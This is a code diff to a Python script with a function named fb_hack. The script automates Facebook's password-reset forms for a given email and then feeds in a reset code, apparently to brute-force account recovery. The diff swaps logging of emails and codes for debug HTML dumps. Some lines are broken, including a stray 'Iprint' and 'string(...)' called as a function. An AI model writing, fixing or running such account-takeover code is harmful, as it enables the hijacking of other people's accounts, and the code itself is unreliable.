@@ -68,39 +68,48 @@ def fb_hack(email, codex):
   try:
     browser.select_form(nr=0)
   except:
-    with open("emails.txt", "a") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a") as z:
-        z.write(str(reset1))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = reset
-    raise
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print(soup.find(string("Facebook is not available on this browser")))
+    with open("output1.html", "w") as file:
+      file.write(str(soup))
+    sys.exit()
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
   try:
     browser.select_form(nr=0)
+    browser.submit()
   except:
-    with open("emails.txt", "a") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a") as z:
-        z.write(str(codex))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = reset
-    raise
-  browser.submit()
-  browser.select_form(nr=0)
-  browser.submit()
-  browser.select_form(nr=0)
-  browser.submit()
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print(soup.find(string("Facebook is not available on this browser")))
+    with open("output2.html", "w") as file:
+      file.write(str(soup))
+    sys.exit()
+  try:
+    browser.select_form(nr=0)
+    browser.submit()
+  except:
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print(soup.find(string("Facebook is not available on this browser")))
+    with open("output3.html", "w") as file:
+      file.write(unicode(soup))
+    sys.exit()
+  try:
+    browser.select_form(nr=0)
+    browser.submit()
+  except:
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    Iprint(soup.find(string("Facebook is not available on this browser")))
+    with open("output4.html", "w") as file:
+      file.write(str(soup))
+    sys.exit()
   """reset code input"""
   y = int(codex)
   response1 = browser.response()
